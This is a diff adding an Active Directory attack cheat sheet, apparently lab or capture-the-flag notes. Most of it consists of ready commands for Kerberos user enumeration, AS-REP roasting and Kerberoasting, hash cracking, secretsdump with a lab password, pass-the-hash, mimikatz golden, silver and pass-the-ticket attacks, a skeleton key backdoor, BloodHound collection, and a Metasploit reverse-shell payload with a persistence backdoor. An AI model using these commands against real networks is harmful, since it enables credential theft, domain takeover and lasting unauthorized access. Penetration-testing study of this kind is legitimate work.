@@ -1,0 +1,160 @@
+= Active Directory
+
+== Enumeration
+Use `nmap`, `kerbrute`, `rubeus` or `enum4linux`.
+
+If kerberos, use `kerbrute` to find username.
+
+== Attack
+
+=== Abusing Kerberos
+Abuse a feature within Kerberos with an attack method called ASREPRoasting.
+
+ASREPRoasting = user account has the privilege "Does not require Pre-Authentication"; the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
+
+Use "GetNPUsers.py" of `impacket`.
+
+`GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.188.91 spookysec.local/`
+
+If you find one, find hash type in https://hashcat.net/wiki/doku.php?id=example_hashes[hashcat - hash types]
+
+krb5asrep for Kerberos is 18200, copy the hash found and crack it with `hashcat`
+
+`hashcat -m 18200 hash.txt passwordlist.txt`
+
+With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.
+
+Use `smbclient` to list shares: `smbclient -L 10.10.188.91 -U svc-admin`
+
+Connect to the share and browse: `smbclient \\\\10.10.188.91\\backup -U svc-admin` then get file using `get`.
+
+=== Elevation Privilege
+If an account found in enumeration has the permission that allows all Active Directory changes to be synced with this user account, we can get password hashes. Possible to have that with a backup account.
+
+Use tool `secretdump.py` from impacket.
+
+`secretsdump.py spookysec.local/backup:backup2517860@10.10.188.91`
+
+With the hashes, we can just use `evil-winrm` tool with pass-the-hash attack to access the users.
+
+=== Attacking kerberos
+How to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.
+
+=== Harvesting & Brute-force tickets
+Use `rubeus`
+
+* `Rubeus.exe harvest /interval:30`
+* `Rubeus.exe brute /password:Password1 /noticket`
+
+=== Kerberoasting
+Use `Rubeus.exe kerberoast` or `GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.110.253 -request` (Impacket) to get the hash and try cracking with hashcat.
+
+`hashcat -m 13100 -a 0 hash.txt Pass.txt`
+
+=== AS-REP Roasting
+During pre-authentication, users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request.
+
+After validating the timestamp, the KDC will then issue a TGT for the user. If pre-authentication is disabled, we can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say they are.
+
+`Rubeus.exe asreproast` then `hashcat -m 18200 -a 0 hash.txt Pass.txt`
+
+=== Golden/Silver ticket attacks
+Use `mimikatz.exe`
+
+Golden ticket
+[source, bash]
+----
+mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+----
+Then use this information for `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`
+
+For silver ticket, we get the service instead
+[source, bash]
+----
+mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:SQLService
+----
+Then same command (even with golden) but with the info of the service.
+
+=== Pass the ticket
+[source, shell]
+----
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export
+kerberos::ptt <ticket>
+----
+
+=== Skeleton key attacks
+Create a backdoor with mimikatz.exe
+
+Target machine:
+[source, shell]
+----
+mimikatz.exe
+privilege::debug
+misc::skeleton
+----
+
+Attacker machine:
+[source, shell]
+----
+net use c:\\DOMAIN-CONTROLLER\admin$ /usr:Administrator mimikatz
+dir \\Desktop-1\c$ /user:Machine1 mimikatz
+----
+
+== Post Exploitation
+
+=== PowerView
+Once we have a shell on the machine, we can use PowerView to get more information. PowerView needs to be uploaded on the target machine.
+
+[source, bash]
+----
+powershell -ep bypass
+. .\PowerView.ps1
+----
+
+=== SharpHound / BloodHound
+Once you have a shell on the machine, use `PowerView` or `SharpHound/BloodHound` to find extra informations.
+
+[source, shell]
+----
+powershell -ep bypass
+. .\SharpHound.ps1
+(bloodhound v2) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+(bloodhound v3) .\SharpHound.exe -c all -d CONTROLLER.local --zipfilename loot3.zip
+----
+
+=== Server Manager
+Built-in windows feature, can be used if we have domain admin to change trusts, add/remove users, groups. This can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network.
+
+Must use RDP.
+
+* look at users (can sometimes see credentials in description)
+* event viewer to see the logs
+
+=== Maintain access
+Metasploit has persistence module to allow us to create a backdoor service in the system
+
+[source, bash]
+----
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
+scp shell.exe user@machine:~
+msfconsole > use exploit/multi/handler
+msfconsole > set payload windows/meterpreter/reverse_tcp
+msfconsole > setg LHOST vpn_ip
+msfconsole > run
+(target) execute shell.exe
+meterpreter > background
+msfconsole > use exploit/windows/local/persistence
+msfconsole > set session 1
+msfconsole > run
+----
+
+To get a new shell, we just need to run exploit/multi/handler again.
+
+Mimikatz skeleton key
+
